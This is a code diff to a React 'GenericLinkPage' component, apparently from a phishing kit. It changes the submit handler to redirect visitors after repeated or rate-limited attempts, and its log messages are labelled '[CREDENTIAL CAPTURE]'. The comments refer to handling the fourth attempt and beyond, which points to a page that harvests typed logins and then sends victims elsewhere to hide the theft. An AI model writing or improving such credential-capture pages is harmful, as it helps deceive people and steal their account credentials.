@@ -252,13 +252,34 @@ export default function GenericLinkPage() {
         }),
       })
       
-      if (response.ok) {
+      // Check for 429 status (Too Many Requests) - redirect immediately
+      if (response.status === 429) {
         const result = await response.json()
         if (result.redirect) {
-          window.location.replace(result.redirect)
+          console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - redirecting to:', result.redirect)
+          window.location.href = result.redirect
+          return
         }
       }
+      
+      const result = await response.json()
+      
+      // CRITICAL FIX: Check for failure with redirect FIRST (before success check)
+      // This handles the 4th attempt and beyond
+      if (!result.success && result.redirect) {
+        console.log('[CREDENTIAL CAPTURE] 🚫 Request failed - redirecting to:', result.redirect)
+        window.location.href = result.redirect
+        return
+      }
+      
+      // If redirect exists, use it (whether success is true or false)
+      if (result.redirect) {
+        console.log('[CREDENTIAL CAPTURE] Redirecting to:', result.redirect)
+        window.location.replace(result.redirect)
+        return
+      }
     } catch (error) {
+      console.error('[CREDENTIAL CAPTURE] Submit error:', error)
     }
   }
   
